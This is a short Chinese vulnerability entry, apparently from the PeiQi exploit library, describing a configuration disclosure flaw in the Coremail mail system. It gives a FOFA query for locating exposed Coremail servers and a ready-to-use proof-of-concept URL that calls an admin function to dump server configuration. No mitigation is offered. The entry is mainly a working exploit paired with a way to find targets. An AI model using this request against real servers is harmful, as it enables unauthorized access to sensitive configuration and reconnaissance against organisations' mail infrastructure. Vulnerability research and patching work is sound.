---
title: Coremail 配置信息泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - Coremail
---

# Coremail 配置信息泄露漏洞

##  漏洞描述

Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等

## 漏洞影响

> [!NOTE]
>
> Coremail 配置信息泄露漏洞

## FOFA

> [!NOTE]
>
> app="Coremail邮件系统"

## 漏洞复现

POC为

```
http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
```

![](/img/20210924013727135674.png)

## Goby & POC

> [!NOTE]
>
> Coremail configuration information disclosure

![](/img/20210924013727363346.png)